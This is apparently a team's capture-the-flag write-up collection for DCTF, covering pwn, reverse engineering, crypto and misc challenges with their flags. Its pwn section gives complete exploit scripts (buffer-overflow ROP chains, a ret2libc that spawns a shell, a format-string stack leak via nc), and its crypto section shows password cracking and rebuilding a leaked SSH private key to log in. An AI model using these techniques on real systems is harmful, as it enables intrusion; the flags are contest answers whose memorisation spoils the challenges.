# ***PWN***

## ***PWN_SANITY_CHECK***

```py
from pwn import *

binary = context.binary = ELF('./pwn_sanity_check')
p = remote('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io', 7480)

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi_r15 = next(binary.search(asm('pop rsi; pop r15; ret')))

payload  = b''
payload += b'A' * 72
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi_r15)
payload += p64(0x1337c0de)
payload += p64(0)
payload += p64(binary.sym.win)

p.sendlineafter('joke\n',payload)
p.interactive()
```
Flag: ***``dctf{Ju5t_m0v3_0n}``***

## ***PINCH_ME***

```py
from pwn import *

binary = context.binary = ELF('./pinch_me')
p = remote('dctf1-chall-pinch-me.westeurope.azurecontainer.io', 7480)

payload  = b''
payload += b'A' * 24
payload += p64(0x1337c0de)

p.sendlineafter('?\n',payload)
p.interactive()
```
Flag : ``***dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}``***

## ***README***

The vuln function reads flag.txt into a local (local_58) stack array.

The vulnerability is the printf(local_38) statement that is missing a format string. Exfiltrating the flag is as simple as passing %nn$p format strings where nn is the position in the stack; starting from 6 just increment until the output starts with dctf (nn = 8), then continue until you have the flag.

```c
for((p=8;p<14;p++)) {
    echo '%'$p'$p' | \
    nc dctf-chall-readme.westeurope.azurecontainer.io 7481 | \
    grep 'hello ' | \
    awk -Fx '{print $NF}' | \
    xxd -r -p | \
    rev
}
```

This bash script will echo %8$p, then echo %9$p, etc... into the challenge service serially (one by one), capturing the output (grep, awk), converting to text (xxd), and then finally reversing the string (rev, since x86_64 is little endian).

```
dctf{n0w_g0_r3ad_s0me_b0rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
rev: stdin: Invalid or incomplete multibyte or wide character
```
By guessing the last letters as `0k5`.

Flag : ***```dctf{n0w_g0_r3ad_s0me_b00k5}```***

## ***MAGIC_TRICK***

```py
from pwn import *

binary = context.binary = ELF('./magic_trick')

p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)

p.sendlineafter('write\n', str(binary.sym.win))
p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
print(p.recvuntil('}').decode())
```

Flag : ***```dctf{1_L1k3_M4G1c}```***

## ***BABY_BOF***

```py
from pwn import *

binary = context.binary = ELF('./baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')

puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')
p.interactive()
```
Flag : ***```dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}```***

https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md

similiar : https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/roprop 
           
   https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what
   
# ***REVERSE ENGINEERING***

## **BELL**

```py
def triangle(a, b):
    lVar1 = lVar2 = 0

    if a < b:
        lVar1 = 0
    else:
        if (a == 1) and (b == 1):
            lVar1 = 1
        else:
            if b == 1:
                lVar1 = triangle(a - 1, a - 1)
            else:
                lVar2 = triangle(a, b - 1)
                lVar1 = triangle(a - 1, b - 1)
                lVar1 = lVar1 + lVar2
    return lVar1


n = int(input("Enter the first number that was printed: "))
for k in range(1, n + 1):
    print(triangle(n, k))
```
By running the ```nc dctf-chall-bell.westeurope.azurecontainer.io 5311```

By giving the number that came in when we enter the port in the above program we get some values if we enter those values in the port we get the flag.

Flag : ***```dctf{f1rst_step_t0wards_b3ll_l4bs}```***

## ***JUST IN TIME***

This will give the flag.

***```ltrace -s 90 ./justintime````***
```
malloc(8)                                        = 0x5631a2b6e2a0
malloc(8)                                        = 0x5631a2b6e2c0
fopen(&quot;./justintime&quot;, &quot;rb&quot;)                      = 0x5631a2b6e2e0
fread(0x5631a2b6e2c0, 8, 1, 0x5631a2b6e2e0)      = 1
fclose(0x5631a2b6e2e0)                           = 0
strncpy(0x5631a2b6e2a0, &quot;\177ELF\002\001\001&quot;, 8) = 0x5631a2b6e2a0
malloc(39)                                       = 0x5631a2b6e4c0
strncpy(0x5631a2b6e4c0, &quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;, 39) = 0x5631a2b6e4c0
strlen(&quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;) = 38
puts(&quot;Decryption finished.&quot;Decryption finished.
)                     = 21
malloc(39)                                       = 0x5631a2b6e900
malloc(40)                                       = 0x5631a2b6e930
strncpy(0x5631a2b6e900, &quot;dctf{df77dbe0c407dd4a188e12013ccb009f}&quot;, 39) = 0x5631a2b6e900
malloc(40)                                       = 0x5631a2b6e960
strlen(&quot;\033&amp;8 yegHr($g1bKu{&quot;f5`N}t#331Nv/%`11F#1&quot;) = 38
free(0x5631a2b6e4c0)                             = &lt;void&gt;
free(0x5631a2b6e960)                             = &lt;void&gt;
free(0x5631a2b6e2a0)                             = &lt;void&gt;
+++ exited (status 0) +++
```

Flag : ***``dctf{df77dbe0c407dd4a188e12013ccb009f}``***

## ***TINY INTERPRETER***

We are given to files one interprter file and bin file.

If we run **``./interpreter``** bin we get the flag.

Flag : ***``dctf{Interpreter_written_in_C_is_a_great_idea}``***

# ***CRYPTO***

## ***THIS ONE IS REALLY BASIC***

```py
import base64
cipher = ""
with open('cipher.txt', 'r') as f:
    cipher = f.readlines()

real_cipher = cipher[0].strip()

for i in range(42):
    real_cipher = base64.b64decode(real_cipher).decode()

print(real_cipher)
```

Flag : ***```dctf{Th1s_l00ks_4_lot_sm4ll3r_th4n_1t_d1d}```***

## ***STRONG PASSWORD***

WE can crack the password using *`JOHN THE RIPPER`*

***```zip2john strong_password.zip > zip.hash```***

***```john --wordlist=rockyou.txt zip.hash```***

We get the password as **``Bo38AkRcE600X8DbK3600``**

In the lorem.txt we find the flag by ``cat lorem.txt | grep dctf``

Flag: ***```dctf{r0cKyoU_f0r_tHe_w1n}```***

## ***JULIUS ANCIENT SCRIPT***

We are given a flag.txt 

We can get the flag by decoding as ceaser cipher 

Flag : ***```dcTf{Th3_d13_h4S_b33N_c4ST}```***

## ***FORGOTTEN SECRET***

For this challenge you were given a docker image and a hint that it doesn't follow best practices. To get the files from the image, you just need to untar it:
```
tar xf image
for f in `ls */layer.tar`; do tar xf $f; done
This leaves us with 3 files of interest among the extracted files: 7dabd7d32d701c6380d8e9f053d83d050569b063fbcf7ebc65e69404bed867a5.json, root/.ssh/id_rsa and home/alice/cipher.bin. After viewing the SSH private key in id_rsa and the ciphertext in cipher.bin, I had a look in 7dabd7d32d701c6380d8e9f053d83d050569b063fbcf7ebc65e69404bed867a5.json. In this file, everything is normal except for a leaked environment variable, SECRET_KEY. But how can this help us?
```

So, after trying to open id_rsa in the python interpreter, we get an invalid key format error. So, that must mean that id_rsa is encrypted. But with which key? Luckily we have SECRET_KEY from before.
```py
from Crypto.Util.number import bytes_to_long, isPrime
from Crypto.PublicKey import RSA
from base64 import b64decode


# Partial private key received from image
upper_key = b"""
MIIJKQIBAAKCAgEAupQ7hhy0AQR0LRMZgP/Kl6J3l2+U+wp1YyVB8oDYvslE3AXU
3igwX2LOYgG/JIHQ5UI2G/0Fu5iPPikh3JoUABGFyPwWsBLnohdBBtpvfRLprhbB
lsKwjZfLJIrRex+sSFkcT9zVs1VH4JfcJAbeBNK/aQdMqc1i4JQ1xsQny4ZH7TZe
CXBigK99+V05C+ENRS1uWi9ixgcbMWCCBHsTq0Kl5FIfPvVJVBr075bf7DdARSRU
Wx/FtKVMlWe/nGUTz/ezu2jOx69kd+hvtzX1JVkeY+AFi7Ldta2tNaH/8kitzoXK
JC+6A+LQXynmjQdH9RGsg7QygFjPvIcgwE8LHsMt62OKcIx5LMHlW4lvLK/EZMnr
"""

lower_key = b"""
ZEt6WwyEqHhPyP0CggEBAMplAvElBwRTMaT6FfWwi149Q+C1+ogaRc686CkCEs7p
zWjt4+Tg3cndxj/p2Q3Z1AzJH8h/vfZruAQHF/UFwXIAPmuzS1K0HgnNHxr355vs
AYfArpTJeyZoRttQOXvRhM+c887RWGXX278VVS5e5mh16Dn0rKpDcRnsVMahBhTg
+4XheX0zJRa3lOnoWgRLFGcJj9px4Gk7PkZnx24S2bCb7GUbisvtELkLfAvVcGIS
vvJGbeovAGpArRoaCbpnRL96N50zOWGqHeXJFljvNDvfpVAbykf+50d2VApvElQ3
/v7UHVZEfszMk3g1z+RLpgVmtltCsFvDSkDW9omfoJ0CggEBAIBfu08VPrN+B8iD
QpyO2BBUDei8fjdskpvehjWGDqzKNYDxdVcAdERtk6DSWuzpvwPNbTRm6u3v66yu
QkHn9gBlxX1sYe5P9ExqP2p+Au8hR/8s7bhVa8G53WX1Dl47QVSwbKVOWSWtQSwB
hiB9s1YqgAlhcKBWP6vFbavr3VBYY5ln/018rYvR1euDVTUVZdSMmbq3gScF4fhv
NESMd1Je7XjygbVTPJPi1PcT/SgyDRUwz0RPYIvLlA3qT9ae7s5WTp1fanv5MV6p
4LnekTQ/CVjWSorY7xdXTCMfBK1GF7WhVGG4fVSPX8QeIPKUxKkQXgKAFJrCSjj7
CLG5pPkCggEAflfmKUDTC4kfkXwoXzHxHkgialFPbszvzOmyB39q3E2pU5pFTChv
"""

def get_values(priv_key):
    results = []
    data = hex(bytes_to_long(b64decode(priv_key)))
    results = data.replace('02820100', ',0x').replace('0282010100', ',0x').replace('0282020100', ',0x').split(',') # should be modified accordingly
    return results

#print ("[*] Upper key values:", get_values(upper_key))
#print ("\n")
#print ("[*] Lower key values:", get_values(lower_key))
#print ("\n")

#N_upper_bits = 0xba943b861cb40104742d131980ffca97a277976f94fb0a75632541f280d8bec944dc05d4de28305f62ce6201bf2481d0e542361bfd05bb988f3e2921dc9a14001185c8fc16b012e7a2174106da6f7d12e9ae16c196c2b08d97cb248ad17b1fac48591c4fdcd5b35547e097dc2406de04d2bf69074ca9cd62e09435c6c427cb8647ed365e09706280af7df95d390be10d452d6e5a2f62c6071b316082047b13ab42a5e4521f3ef549541af4ef96dfec37404524545b1fc5b4a54c9567bf9c6513cff7b3bb68cec7af6477e86fb735f525591e63e0058bb2ddb5adad35a1fff248adce85ca242fba03e2d05f29e68d0747f511ac83b4328058cfbc8720c04f0b1ec32deb638a708c792cc1e55b896f2cafc464c9eb
#p_lower_bits = 0x644b7a5b0c84a8784fc8fd
q = [0xca6502f12507045331a4fa15f5b08b5e3d43e0b5fa881a45cebce8290212cee9cd68ede3e4e0ddc9ddc63fe9d90dd9d40cc91fc87fbdf66bb8040717f505c172003e6bb34b52b41e09cd1f1af7e79bec0187c0ae94c97b266846db50397bd184cf9cf3ced15865d7dbbf15552e5ee66875e839f4acaa437119ec54c6a10614e0fb85e1797d332516b794e9e85a044b1467098fda71e0693b3e4667c76e12d9b09bec651b8acbed10b90b7c0bd5706212bef2466dea2f006a40ad1a1a09ba6744bf7a379d333961aa1de5c91658ef343bdfa5501bca47fee74776540a6f125437fefed41d56447ecccc937835cfe44ba60566b65b42b05bc34a40d6f6899fa09d]
#dp = 0x805fbb4f153eb37e07c883429c8ed810540de8bc7e376c929bde8635860eacca3580f175570074446d93a0d25aece9bf03cd6d3466eaedefebacae4241e7f60065c57d6c61ee4ff44c6a3f6a7e02ef2147ff2cedb8556bc1b9dd65f50e5e3b4154b06ca54e5925ad412c0186207db3562a80096170a0563fabc56dabebdd5058639967ff4d7cad8bd1d5eb8355351565d48c99bab7812705e1f86f34448c77525eed78f281b5533c93e2d4f713fd28320d1530cf444f608bcb940dea4fd69eeece564e9d5f6a7bf9315ea9e0b9de91343f0958d64a8ad8ef17574c231f04ad4617b5a15461b87d548f5fc41e20f294c4a9105e0280149ac24a38fb08b1b9a4f9
#dq_upper_bits = 0x7e57e62940d30b891f917c285f31f11e48226a514f6eccefcce9b2077f6adc4da9539a454c286f
e = 0x10001

def get_p():
    result = []
    dp = int(get_values(lower_key)[2], 16) # just comment this if you add the values inside script ^ like above
    for kp in range(1, e):
        p_mul = dp * e - 1
        if p_mul % kp == 0:
            p = (p_mul // kp) + 1
            if isPrime(p):
                result.append(p)
    return result

def get_n():
    n = [P * Q for P in get_p() for Q in q]
    return n


# Fixed reconstruct function which should be faster
def reconstruct_RSA2(pt, qt, nt):
    # Find all p * q == n combinations and make a dictionary
    combinations = {n: (x, y) for n in nt for x in pt for y in qt if n == x * y}

    if len(combinations) > 1:
        print("\n[*] Printing multiple keys\n\n")
    else:
        print("[*] Final key incoming..\n\n")
    # loop through hashmap where n = p*q combinations. n = n and p_and_q tuple where p and q
    for n, p_and_q in combinations.items():
        p, q = p_and_q[0], p_and_q[1]

        # last RSA calculations before reconstructing the private key
        phi = (p - 1) * (q - 1)
        d = pow(e, -1, phi)
        key = RSA.construct((n, e, d, p, q))
        pem = key.exportKey('PEM')
        print(pem.decode(), "\n\n\n")
        f = open('dctf_id_rsa', 'w')
        f.write(pem.decode())
        f.close

if __name__ == '__main__':
    reconstruct_RSA2(get_p(), q, get_n())
    print ("[*] Creating id_rsa...")
    import os; os.chmod('dctf_id_rsa', 0o600)
    print ("[*] Connecting to target server...")
    import paramiko
    hostname = 'dctf1-chall-private-encryption-mistake.westeurope.azurecontainer.io'
    port = 2222
    user = 'user'
    key = 'dctf_id_rsa'
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=user, key_filename=key, port=port)
    shell = ssh.invoke_shell()
    print(shell.recv(8192).decode())
    print(shell.recv(8192).decode())
```
As there were only three files of interest, is was obvious that cipher.bin would be what needs decryption. After unlocking the SSH private key id_rsa, I just converted the ciphertext to an integer, and manually decrypted it with c^d mod n.

## ***SCOOBY-DOO***

```c
a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in {1..22}
do
s=$(cat cipher.txt | cut -b "$i" | tr -d '\n')
  for x in {0..25}
  do
      c=${a:$x:1}
      if [[ $s == *"$c"* ]]
      then
          printf ''
      else
          printf ${a:$x:1}
      fi
   done
done
```

Flag : ***```DCTFTURINGWOULDBEPROUD```***

## ***JUST TAKE YOUR TIME***

```py
import socket
from time import time
from Crypto.Cipher import DES3
from binascii import unhexlify

remotehost = "dctf-chall-just-take-your-time.westeurope.azurecontainer.io"
remoteport = 9999

# Connect to the remote side and capture the output
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((remotehost, remoteport))
output1 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output1 + "\n")

# Parse and process the output to calculate result 1
remotelines = output1.splitlines();
num1 = remotelines[1].split()[0];
num2 = remotelines[1].split()[2];
print("debug number extract: 1=" + num1 + " 2=" + num2)
result1 = str(int(num1) * int(num2))
print("debug multiplication: " + result1)

# Send result to remote side, and check response
s.send(bytearray(result1 + "\n", 'utf-8'))
output2 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output2 + "\n")

# Parse and process the output to calculate result 2
remotelines = output2.splitlines();
enc = remotelines[1];
print("debug cipher extract: enc=" + enc)

# Generate the decryption key based on the timestamp
key = str(int(time())).zfill(16).encode("utf-8")
print("debug decryption key: key=" + str(key.decode("utf-8")))

# Decrypt the ciphertext
cipher = DES3.new(key, DES3.MODE_CFB, b"00000000")
cleartext = str(cipher.decrypt(unhexlify(enc)).decode("utf-8"))
print("debug show cleartext: clr=" + cleartext)

# Sent decryption result to remote, and check for flag
s.send(bytearray(cleartext + "\n", 'utf-8'))
output3 = str(s.recv(1024).decode("utf-8"))
print("debug remote output:\n" + output3 + "\n")
```
Flag : ***```dctf{1t_0n1y_t0Ok_2_d4y5...}```***

## ***A SIMPLE SP BOX***

```py
from pwn import *
from string import ascii_letters, digits
from math import ceil, log

ALPHABET = ascii_letters + digits + "_!@#$%.'\"+:;<=}{"
s_box = {}
flag_length = 42
rounds = int(2 * ceil(log(flag_length, 2)))
p = remote('dctf1-chall-sp-box.westeurope.azurecontainer.io', 8888)
p.recvline()
ct = p.recvline().strip().decode()
info(ct)

for i in range(len(ALPHABET)):
    p.sendlineafter('> ', ALPHABET[i] * flag_length)
    p.recvline()
    s_box[p.recvline().decode()[0]] = ALPHABET[i]
print(s_box)
flag = ''
for c in ct:
    flag += s_box[c]
info(flag)
def un_shuffle(message):
    global flag_length
    result = [''] * flag_length
    first = message[:flag_length//2]
    second = message[flag_length//2:]
    i = 0
    f = 0
    s = 0
    while i < flag_length:
        if i % 2 == 1:
            result[i] = first[f]
            f += 1
        else:
            result[i] = second[s]
            s += 1
        i += 1
    return ''.join(result)

for _ in range(rounds - 1):
    flag = un_shuffle(flag)

success(flag)
p.sendline(flag)
p.interactive()
```
Flag : ***```dctf{S0_y0u_f0und_th3_cycl3s_in_th3_s_b0x}```***

# ***MISC***

## ***Encrypted the flag I have***

The provided image contained some characters which were a part of “Aurebesh” language from Star Wars.

![image](https://user-images.githubusercontent.com/73250884/118488035-f4ea9d00-b738-11eb-9df9-4349d2969d47.png)


Aurebesh is a writing system used to represent spoken Galactic Basic and is the most commonly seen form of written language in the Star Wars franchise.

Here is a screenshot of conversion of the characters to readable ASCII format.
![image](https://user-images.githubusercontent.com/73250884/118488125-0c298a80-b739-11eb-8ab5-043710a91a9d.png)

By decoding each character we get the flag 

Flag : ***```DCTF{MASTERCODEBREAKER}```***

## ***DRAGON***

This flag was hidden inside the layers of the image. We used a tool called Stegsolve to extract the flag.

java -jar stegsolve.jar

The file was imported in the tool as follows:

![image](https://user-images.githubusercontent.com/73250884/118488616-8bb75980-b739-11eb-8914-e56427853653.png)

The different views were browsed by clicking in the arrow buttons and the flag was found in “Blue plane 1”

![image](https://user-images.githubusercontent.com/73250884/118488690-9f62c000-b739-11eb-82b9-61cf94d56e19.png)

Flag : ***```dctf{N0w_Y0u_s3e_m3}```***

## ***LEAK SPIN***

The description says the flag was online somewhere! had to be in some social account. Finally found it on their github page.

![image](https://user-images.githubusercontent.com/73250884/118489871-f4530600-b73a-11eb-941e-9d8ef7f5c37c.png)

Flag : ***```dctf{I_L1k3_L1evaAn_P0lkk4}```***

## ***DON'T LET IT RUN***

We are given a pdf file if we put that file in cyberchef and do hex decoding we get the flag.

![image](https://user-images.githubusercontent.com/73250884/118490511-a38fdd00-b73b-11eb-81a7-0c5235ec5526.png)

Flag : ***```dctf{pdf_1nj3ct3d}```***

## ***HIDDEN MESSAGE***

We are given an image. using zsteg we can get the flag.

```zsteg fri.png```

![image](https://user-images.githubusercontent.com/73250884/118491474-aa6b1f80-b73c-11eb-803a-2f611545503d.png)

Flag : ***```dctf{sTeg0noGr4Phy_101}```***

## ***SHOW US YOUR ID***

We are given a pdf file if we put that file in cyberchef and do hex decoding we get the flag.

![image](https://user-images.githubusercontent.com/73250884/118491967-26fdfe00-b73d-11eb-8535-f2646a9fc412.png)

Flag : ***```dctf{3b0ba4}```***

## ***Bad Apple***

I downloaded the file and opened and heard some weird sound in the middle. So extracted audio and analysed in sonic vision and added A spectrogram was used to find a QR code.

![image](https://user-images.githubusercontent.com/78896740/118483703-f82f5a00-b733-11eb-9b1e-d2d4637ca63e.png)

![image](https://user-images.githubusercontent.com/78896740/118483934-43e20380-b734-11eb-9114-c45f4a2af5c6.png)

converted into black and white and scanned QR code and got the flag.

Flag : ***```dctf{sp3tr0gr4msAreCo0l}```***

## ***Extraterrestrial Communication***

As the chall said the audio might be SSTV.

So i used QSSTV initially but it didn't work well do i shifted to Robot36.

There is an app in playstore for Robot36 :https://play.google.com/store/apps/details?id=xdsopl.robot36&hl=en_IN&gl=US.
I played the audio given and got an image.

![image](https://user-images.githubusercontent.com/78896740/118482031-d339e780-b731-11eb-94a0-02d6103c4345.png)

it's not so clear so tried again and ended up with

![image](https://user-images.githubusercontent.com/78896740/118482075-e2209a00-b731-11eb-96ef-1f067d808b7e.png)

Flag : ***```dctf{what_ev3n_1s_SSTV}```***

## ***Powerpoint programming***

Initially i tried to open oit directly but the complete screec looks like some lockscreen page where there is keys and if we type the flag it gives correct or not.
So next thing I did is to open the file in the PowerPoint. And it looks good now because now the screen isn't locked it like a editable ppsx.

![image](https://user-images.githubusercontent.com/78896740/118482768-d1245880-b732-11eb-8dc6-ede9653434c4.png)

And now I opened the Animation plane to see the exact animation where we get the slide correct. In Animation there are many triggers and all dores the same job.(triggres after 86)

![image](https://user-images.githubusercontent.com/78896740/118482931-0761d800-b733-11eb-8be1-cf90f5666645.png)

And I started pressing them manually and noted the flag.

 Flag : ***```DCTF {PPT_1SNT_V3RY_S3CUR3_1S_1T}```***
